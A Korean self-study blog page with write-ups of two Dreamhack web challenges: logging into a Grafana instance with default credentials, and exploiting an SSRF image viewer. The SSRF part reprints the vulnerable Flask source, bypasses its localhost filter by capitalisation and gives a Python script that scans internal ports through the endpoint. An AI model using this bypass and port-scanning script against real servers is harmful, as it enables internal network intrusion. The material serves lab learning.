---
layout: default
title: Day70
nav_order: 1

parent: Last Project
grand_parent: P4C
---

##### 해당 게시글은 스스로 공부하기 위한 게시글입니다.

-----

마지막으로 받은 과제는 다 끝내기로 스스로에게 약속했다.

# > dreamhack.io: web-misconf-1

![image-20220627130557412](../img/image-20220627130557412.png)

## writeup

주어진 문제 파일에 도커파일이 있길래 빌드를 해야하나 고민하다가 일단 웹페이지에 접속을 했다. 

![image-20220627130636380](../img/image-20220627130636380.png)

로그인 정보가 하나도 없는 상태에서 로그인 페이지만 존재했고, 이 웹사이트를 대상으로 injection을 해야하나 생각했다.

아무런 힌트가 없는 상황이여서 개발자도구 탭을 이용해 소스를 계속 읽어보았지만 마땅한게 없었다.

다운로드 받은 문제 파일을 다시 확인해보다가 `default.ini`라는 파일을 발견했고 해당 파일에서 `DH{`를 검색해보았는데

![image-20220627130806055](../img/image-20220627130806055.png)

조직 이름이 플래그 값으로 설정되어 있다는 힌트만을 얻었다. 결국에는 로그인하여 계정 정보나 설정란에서 확인할 수 있다는 것인데 어떻게 로그인을 할지 막막하다.

댓글을 통해 힌트를 봤는데 다들 5초만에 풀었다,,, 이게 웹해킹 맞냐,,, 라는 반응이 많아서 나만 바보인가 생각 중이다.

Grafana에 대해 검색을 해보았는데 "다중 플랫폼 오픈 소스 분석 및 대화형 시각화 웹 애플리케이션" 이라고 한다. 음?

댓글을 좀 더 읽다가 "허술하다" 라는 말에 꽂혀서 마치 기본 아이디가 있나싶어 "grafana" 기본 계정을 검색했더니...

![image-20220627131036205](../img/image-20220627131036205.png)

이 정보로 로그인이 되었고 `~/admin/settings` 페이지에서 플래그를 확인할 수 있었다.

![image-20220627131117970](../img/image-20220627131117970.png)

나만 15분이나 걸렸다...

<br><br><br>

-----

# > dreamhack.io: web-ssrf

## writeup

```python
#!/usr/bin/python3
from flask import (
    Flask,
    request,
    render_template
)
import http.server
import threading
import requests
import os, random, base64
from urllib.parse import urlparse

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()  # Flag is here!!
except:
    FLAG = "[**FLAG**]"


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/img_viewer", methods=["GET", "POST"])
def img_viewer():
    if request.method == "GET":
        return render_template("img_viewer.html")
    elif request.method == "POST":
        url = request.form.get("url", "")
        urlp = urlparse(url)
        if url[0] == "/":
            url = "http://localhost:8000" + url
        elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc):
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
            return render_template("img_viewer.html", img=img)
        try:
            data = requests.get(url, timeout=3).content
            img = base64.b64encode(data).decode("utf8")
        except:
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
        return render_template("img_viewer.html", img=img)


local_host = "127.0.0.1"
local_port = random.randint(1500, 1800)
local_server = http.server.HTTPServer(
    (local_host, local_port), http.server.SimpleHTTPRequestHandler
)


def run_local_server():
    local_server.serve_forever()


threading._start_new_thread(run_local_server, ())

app.run(host="0.0.0.0", port=8000, threaded=True)
```



SSRF는 Server Side Request Forgery 약자로 CSRF와는 달리 서버에 영향을 주는 공격이다. 

![img](https://miro.medium.com/max/1210/1*wfe2TbbRf76PYfrnxUsLDg.png)

이 그림이 CSRF와는 다른 SSRF 개념을 익히는데 도움이 되었다. CSRF는 클라이언트를 대상으로 요청을 변조하였다면, SSRF는 서버에게 다른 서버로 요청을 보내도록 만든 뒤에 응답 결과물을 공격자가 얻어내는 것이다.

이 개념에 충실해서 소스코드를 보면 `run_local_server()`를 통해 다른 내부 서버가 한 개 더 동작하고 있음을 알 수 있고, 해당 내부 서버에 존재하는 `/api/flag`에 대한 결과값을 뱉어내도록하면 될 것 같다. 사용자의 입력에 대한 검증이 첫 문자가 `/` 기호일 경우에만 `127.0.0.1:8000`으로 url을 전송하고, 그 외에는 사용자 입력에 따라 전송을 하지만 "localhost"나 "127.0.0.1"에 대한 문자를 필터링해두고 있다. 

이 문제를 풀기 위해서는 2가지 고려가 필요하겠다.

1. 내부 서버로 접근하기 위해 "localhost"와 "127.0.0.1" 필터링 우회하기
2. 열린 포트가 무엇인지 찾아내기

첫번째 고려사항은, 대소문자 구별이 없다는 점을 이용해 "Localhost"로도 우회할 수 있겠다.

두번째 고려사항은, 결과물이 존재할 때 내뱉은 error.png 정보를 이용해서 error.png가 아닌 경우에 해당 포트가 열려있음으로 판별하면 되겠다.

![image-20220630170539483](../img/image-20220630170539483.png)

해당 이미지가 뜨면 소스값이 `iVBOR...`로 시작하는 정보가 작성되니 해당 코드가 포함되면 실패, 포함되지 않으면 성공으로 해보자

```python
#!/usr/bin/python3
import requests
import sys

def my_request(url):
	target_url = f"http://host3.dreamhack.games:12160/img_viewer"	
	params = {
		"url": url
	}
	response = requests.post(target_url, data=params)	
	return response

def solve():
	for port in range(1500, 1801):
		url = f"http://Localhost:{port}/"
		response = my_request(url)
		if "iVBORw0KGgo" not in response.text:
			print(f"Finally I get port: {port}")
			break
		
	return port

if __name__ == "__main__":
	solve()

```

그리고 그 결과

![image-20220630172943483](../img/image-20220630172943483.png)

1758번 포트가 열려있다는 정보를 얻었고 직접 확인해보니

![image-20220630171801812](../img/image-20220630171801812.png)

다른 포트번호를 넣었을 때와는 달리 깨진 이미지 정보가 나왔다.

![image-20220630171744514](../img/image-20220630171744514.png)

![image-20220630171832009](../img/image-20220630171832009.png)

이렇게 풀어버렸당.
